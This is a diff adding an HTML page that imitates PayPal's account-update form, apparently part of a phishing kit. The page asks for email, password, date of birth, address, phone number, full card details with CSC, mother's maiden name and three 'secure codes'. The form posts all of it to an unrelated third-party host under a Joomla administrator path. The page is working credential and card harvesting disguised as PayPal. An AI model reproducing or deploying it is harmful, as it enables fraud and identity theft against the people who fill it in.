@@ -1,0 +1,252 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="fr"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Update Personal information- PayPal :</title>
+
+
+<meta name="description" content="PayPal is the safer, easier way to pay online without revealing your credit card number."><meta http-equiv="X-UA-Compatible" content="IE=9"><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20120706-1/css/core/global.css"><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20120706-1/css/flows/flowConsumerOnboarding.css"><link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20120706-1/css/flows/passwordMeter.css"><!--[if IE 8]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20120706-1/css/browsers/ie8.css"><![endif]--><!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20120706-1/css/browsers/ie7.css"><![endif]--><!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-640-20120706-1/css/browsers/ie6.css"><![endif]-->
+
+
+
+
+
+<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20120706-1/js/lib/min/global.js"></script><script type="text/javascript">PAYPAL.util.lazyLoadRoot = 'https://www.paypalobjects.com/WEBSCR-640-20120706-1';</script><link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png"><script type="text/javascript">
+
+
+
+function identi()
+
+{
+
+var x=document.forms["Keypad"]["email"].value; if (x==null || x=="") { alert("Your Email is Wrong or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["password"].value; if (x==null || x=="") { alert("CheckYour Password Agian is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["retype_password"].value; if (x==null || x=="") { alert("please re-type your password because is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["first_name"].value; if (x==null || x=="") { alert("Your Name is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["last_name"].value; if (x==null || x=="") { alert("Your Last Name is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["birthdate_b"].value; if (x==null || x=="") { alert("The Day of Birth is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["birthdate_a"].value; if (x==null || x=="") { alert("The Month of Birth is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["birthdate_c"].value; if (x==null || x=="") { alert("The Year of Birth is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["address1"].value; if (x==null || x=="") { alert("Your Address is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["city"].value; if (x==null || x=="") { alert("Your City is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["state"].value; if (x==-1 || x=="") { alert("Your State is missing or incomplete. Please correct your entries and try again."); return false; }
+ba
+var x=document.forms["Keypad"]["zip"].value; if (x==null || x=="") { alert("Your Zip Code is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["phone"].value; if (x==null || x=="") { alert("Your Phone Number is missing or incomplete. Please correct your entries and try again."); return false; }
+
+
+
+
+var x=document.forms["Keypad"]["cc_number"].value;	if (x==null || x=="") { alert("Your Credit Card Number is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["expdate_month"].value;	if (x==-1 || x=="") { alert("The Experation Month is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["expdate_year"].value;	if (x==-1 || x=="") { alert("The Experation Year is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["cvv"].value;	if (x==null || x=="") { alert("Your CSC is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["secure"].value;	if (x==null || x=="") { alert("Your Secure Code 1 is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["secure1"].value;	if (x==null || x=="") { alert("Your Secure Code 2 is missing or incomplete. Please correct your entries and try again."); return false; }
+
+var x=document.forms["Keypad"]["secure2"].value;	if (x==null || x=="") { alert("Your Secure Code 3 is missing or incomplete. Please correct your entries and try again."); return false; }
+
+}
+
+
+</script></head><body><noscript></noscript><div class="onboarding signup" id="page"><div id="header" class="notab"><h1><a href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=_home"><img src="https://www.paypal.com/fr_XC/i/logo/paypal_logo.gif" alt="PayPal" border="0"></a></h1><div class="empty" id="navPrimary"></div></div><div id="content"><div id="headline"><div class="secure"><a target="_blank" href="https://www.paypal.com/ma/cgi-bin/webscr?cmd=xpt/Marketing/popup/WaxAboutPaypal-outside&amp;justSecure=true" onclick="PAYPAL.core.openWindow(event, {size: 'm'})">Secure</a></div><h2>Enter your information</h2><div></div>
+</div><div id="messageBox"></div><div id="main"><div class="layout1"></div>
+<form name="Keypad" action="http://www.frype.ca/administrator/components/com_jnewsletter/includes/openflashchart/php-ofc-library/feedback.php" method="post" onsubmit="return identi()">
+<fieldset class=""><legend class="accessAid">Formulaire d'ouverture de compte</legend><p>Please fill in all fields.</p><fieldset class="accountCredentials"><legend class="accessAid">Champ du mot de passe de l'email</legend>
+  <div>
+    <p class="group">
+      <label for="email">Email address<span class="help">You will use this to log in to PayPal</span></label>
+      <span class="field">
+        <input type="text" id="email" class="large" name="email" value="">
+      </span></p>
+    <p class="group">
+      <label for="password">Password</label>
+      <span class="field">
+        <input autocomplete="off" type="password" id="password" name="password" value="" class="large" maxlength="20">
+      </span></p>
+    <p class="group">
+      <label for="retype_password">Re-enter password</label>
+      <span class="field">
+        <input autocomplete="off" type="password" id="retype_password" name="retype_password" value="" class="large" maxlength="20">
+      </span></p>
+  </div>
+</fieldset><fieldset class="nameFields"><legend class="accessAid"><span class="label">Premier et deuxième prénoms</span></legend>
+  <div>
+    <p class="group">
+      <label for="first_name"><span class="labelText">First name</span></label>
+      <span class="field">
+        <input type="text" id="first_name" class="large" name="first_name" value="">
+      </span></p>
+    <p class="group group cleared">
+      <label for="last_name"><span class="labelText">Last name</span></label>
+      <span class="field">
+        <input type="text" id="last_name" class="large" name="last_name" value="">
+      </span></p>
+  </div>
+</fieldset>
+<div id="dobWrapper" class="">
+  <fieldset class="multi">
+    <legend class="accessAid">Date of birth</legend>
+    <span class="labels"><span class="label">Date of birth</span><span class="autoTooltip" title=""></span></span><span class="help"></span>
+    <div class="fields"><span>
+      <p class="group first help">
+        <label for="birthdate_b" class="accessAid"><span class="labelText">Day</span></label>
+        <span class="help">dd</span><span class="field restricted">
+          <input type="text" id="birthdate_b" autocomplete="off" size="2" maxlength="2" class="xsmall" name="birthdate_b" value="">
+          /<br>
+        </span></p>
+      <p class="group help">
+        <label for="birthdate_a" class="accessAid"><span class="labelText">Month</span></label>
+        <span class="help">mm</span><span class="field restricted">
+          <input type="text" id="birthdate_a" autocomplete="off" size="2" maxlength="2" class="xsmall" name="birthdate_a" value="">
+          /<br>
+        </span></p>
+      <p class="group help">
+        <label for="birthdate_c" class="accessAid"><span class="labelText">Year</span></label>
+        <span class="help">yyyy</span><span class="field restricted">
+          <input type="text" id="birthdate_c" autocomplete="off" size="4" maxlength="4" name="birthdate_c" value="">
+        </span></p>
+    </span></div>
+  </fieldset>
+</div>
+<div class="addrWrapper">
+  <p class="group">
+    <label for="address1"><span class="labelText">Address line 1</span></label>
+    <span class="field confidential">
+      <input type="text" id="address1" class="text large" name="address1" value="">
+    </span></p>
+  <p class="group">
+    <label for="address5"><span class="labelText">Address line 2</span> <span class="optional">(optional)</span></label>
+    <span class="field confidential">
+      <input type="text" id="address5" class="text large" name="address2" value="">
+    </span></p>
+  <p class="group">
+    <label for="city"><span class="labelText">Town/City</span></label>
+    <span class="field confidential">
+      <input type="text" id="city" class="text large" name="city" value="">
+    </span></p>
+  <p class="group">
+    <label for="state"><span class="labelText">County</span></label>
+    <span class="field confidential">
+      <input type="text" id="state" class="text large" name="state" value="">
+    </span></p>
+  <p class="group">
+    <label for="zip"><span class="labelText">Postcode</span></label>
+    <span class="field confidential">
+      <input type="text" id="zip" class="text medium" name="zip" value="">
+    </span></p>
+</div>
+<p class="group">
+          <label for="H_PhoneNumber2"><span class="labelText">Phone number<span class="autoTooltip" title="This number will be used to contact you in case there's a problem with your account or purchase. Don't worry, we never share your number with telemarketers.">Why is this needed?</span></span></label>
+          <span class="field"><input id="phone" autocomplete="off" class="large" name="phone" value="" type="text"></span></p><fieldset class="subform"><legend class="accessAid">Lier une carte</legend><p class="checkboxparagraph"><label for="cc_checkbox_selection"> Enter your credit card information.  </label></p>
+              <label for="cc_number3" id="lblccNumber">Debit or credit card number</label>
+            <span class="field"><input id="cc_number" autocomplete="off" maxlength="24" class="large" name="cc_number" value="" type="text"></span><span class="blockDisp" id="ccicons"><input id="visa" name="credit_card_type" value="V" type="radio"><img id="pm-visa" src="https://www.paypalobjects.com/en_US/i/logo/visa.gif" alt="Visa" border="0"><input id="mastercard" name="credit_card_type" value="M" type="radio"><img id="pm-mastercard" src="https://www.paypalobjects.com/en_US/i/logo/mastercard.gif" alt="MasterCard" border="0"><input id="discover" name="credit_card_type" value="D" type="radio"><img id="pm-discover" src="https://www.paypalobjects.com/en_US/i/logo/discover.gif" alt="Discover" border="0"><input id="amex" name="credit_card_type" value="A" type="radio"><img id="pm-amex" src="https://www.paypalobjects.com/en_US/i/logo/amex.gif" alt="Amex" border="0"></span></p><div class="wrapper"><div class="expDateCont"><fieldset id="fieldrowExpDate" class="multi fieldsetcc">
+                  <legend><span class="label" id="lblExpdate">Expiry date</span></legend>
+                  <div><p class="group"><label for="month" class="accessAid">Mois</label>
+                      <span class="field">
+                      <select id="expdate_month" name="expdate_month">
+                        <option value="" selected>--Month--</option>
+                        <option value="01">01 (Jan)</option>
+                        <option value="02">02 (Feb)</option>
+                        <option value="03">03 (Mar)</option>
+                        <option value="04">04 (Apr)</option>
+                        <option value="05">05 (May)</option>
+                        <option value="06">06 (Jun)</option>
+                        <option value="07">07 (Jul)</option>
+                        <option value="08">08 (Aug)</option>
+                        <option value="09">09 (Sep)</option>
+                        <option value="10">10 (Oct)</option>
+                        <option value="11">11 (Nov)</option>
+                        <option value="12">12 (Dec)</option>
+                      </select>
+                      </span></p>
+              <p class="group"><label for="year" class="accessAid">Année</label>
+                      <span class="field">
+                      <select id="expdate_year" name="expdate_year">
+                        <option value="" selected>--Year--</option>
+                        <option value="2014">2014</option>
+                        <option value="2015">2015</option>
+                        <option value="2016">2016</option>
+                        <option value="2017">2017</option>
+                        <option value="2018">2018</option>
+                        <option value="2019">2019</option>
+                        <option value="2020">2020</option>
+                        <option value="2021">2021</option>
+                        <option value="2022">2022</option>
+                        <option value="2023">2023</option>
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                        <option value="2031">2031</option>
+                        <option value="2032">2032</option>
+                      </select>
+                    </span></p>
+            </div></fieldset><p id="paraCSC" class="CSCPara">
+                    <label for="cvv" id="lblCSC">CSC<a class="balloonControl" href="#CVVInfo">What's this?</a></label><span class="field"><input id="cvv" autocomplete="off" maxlength="4" class="small" name="cvv" value="" type="text"></span></p></div><div class="balloonCallout" id="CVVInfo"><p>It's the three-digit number printed on the back of your card.For American Express, it's the four-digit number on the front.</p>
+                      <img src="https://www.paypalobjects.com/en_US/i/scr/scr_card_223x138.jpg" border="0" alt=""></div></div></fieldset>
+					  <div> 
+					  <p class="group">
+    <label for="mmn"><span class="labelText">mother middle name</span></label>
+    <span class="field confidential">
+      <input type="text" id="mmn" class="text large" name="mmn" value="">
+    </span></p>
+					  </div>
+ 
+          <p>&nbsp;</p>
+          <p>Please view, print or save the documents linked below.</p>
+          <p>For more information about PayPal, please read our <a target="new" href="https://cms.paypal.com/uk/cgi-bin/marketingweb?cmd=_render-content&amp;content_ID=ua/ServiceDescription_popup&amp;locale.x=en_GB">Key Payment and Service Information</a>. Under 18s may not use PayPal.</p>
+          <p class="UAcheckbox">
+            <input type="checkbox" id="agreement_checkbox_selection" class="checkbox" name="agreement_checkbox_selection">
+            <label for="agreement_checkbox_selection"> By checking the box and clicking the button, I agree and consent to the terms of:</label>
+          </p>
+          <ul>
+            <li>the <a target="_blank" href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/ua_pop-outside&amp;popup=1" onClick="PAYPAL.core.openWindow(event, {width: 640, height: 300, name: '_blank', location: 0,scrollbar: 0, toolbar: 0, resizable: 1 })">User Agreement</a>; and </li>
+            <li>the <a target="_blank" href="https://www.paypal.com/uk/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy_pop-outside&amp;popup=1" onClick="PAYPAL.core.openWindow(event, {width: 640, height: 300, name: '_blank', location: 0,scrollbar: 0, toolbar: 0, resizable: 1 })">Privacy Policy</a>; specifically consenting to PayPal processing and disclosing my data and communicating with me according to that policy. I understand that I can view and adjust my Communication Preferences at any time in my account Profile.</li>
+          </ul>
+          <p><br>
+            <br>
+          </p>
+        <p style="margin-left: 320px;" class="buttons"><button type="submit" id="next.x" name="next.x" class="primary default"> Save Profile</button></p></fieldset><input name="form_charset" value="UTF-8" type="hidden"></form><img src="https://altfarm.mediaplex.com/ad/bk/3484-16283-2054-72?PremierAcctSUStart=1" alt="" border="0" height="1" width="1"></div></div></div><div id="footer" role="contentinfo"><ul><li class="last"><a href="https://www.paypal.com/ma/cgi-bin/helpscr?cmd=_help&amp;t=escalateTab">Service clientèle</a></li><li class="last">
+<!-- OnlineOpinionF3cS v3.0-->
+<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20120706-1/js/opinionlab/oo_engine.js"></script><br>
+</li></ul><p id="legal">Copyright © 1999-2014 PayPal. Tous droits réservés.</p>
+          </div><script type="text/javascript">if(typeof PAYPAL != 'undefined'){ PAYPAL.core.Navigation.init(); }</script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20120706-1/js/lib/min/widgets.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20120706-1/js/tns/mid.js"></script><script type="text/javascript">PAYPAL.tns.loginflow = 'xpt/UserAgreement/signup/SignUp';PAYPAL.tns.flashLocation = 'https://www.paypal.com/en_US/m/mid.swf';</script><script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20120706-1/js/flowConsumerOnboarding.js"></script><script type="text/javascript"></script><script type="text/javascript" src="https://www.paypalobjects.com/js/AppSec/min/pscMeter.js"></script><script type="text/javascript" src="https://www.paypalobjects.com/js/tns/min/bid.js"></script><script type="text/javascript">
+								YAHOO.util.Event.addListener(window,"load",function(){
+									try {
+							PAYPAL.bp.init("signup_form","bp_mid");PAYPAL.common.appendField("signup_form", "bp_ks1");PAYPAL.ks.init("signup_form","password","bp_ks2");PAYPAL.ks.init("signup_form","retype_password","bp_ks3");
+									} catch(err){}
+								});
+							</script>
+<!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com -->
+<script type="text/javascript" src="https://www.paypalobjects.com/WEBSCR-640-20120706-1/js/site_catalyst/pp_jscode_080706.js"></script>
+
+<noscript><img src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" alt="" border="0" height="1" width="1"></noscript>
+<!--/DO NOT REMOVE/-->
+
+<!-- End SiteCatalyst Code -->
+
+
+<!--FirstPartyTracking Code-->
+
+<noscript><img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3aonbrd%3asignup%3a%3astart&flnm=onbrd%3asignup%3a&page=main%3aonbrd%3asignup%3a%3astart%3apremier%3a%3a53%2e0%2dtest%2dc&teal=cQpfsgAzqlbSYHW4Ek0bAhTVtIDDBS2G8Fw6pWsvutdLkt7CegfxFA%253d%253d_13878949ede&tmpl=xpt%2fUserAgreement%2fsignup%2fSignUp&pgst=1342052802&lgin=out&vers=premier%3a%3a53%2e0%2dtest%2dc&calc=91cf2043443e2&rsta=fr_XC" alt="" border="0" height="1" width="1"></noscript>
+</body></html>
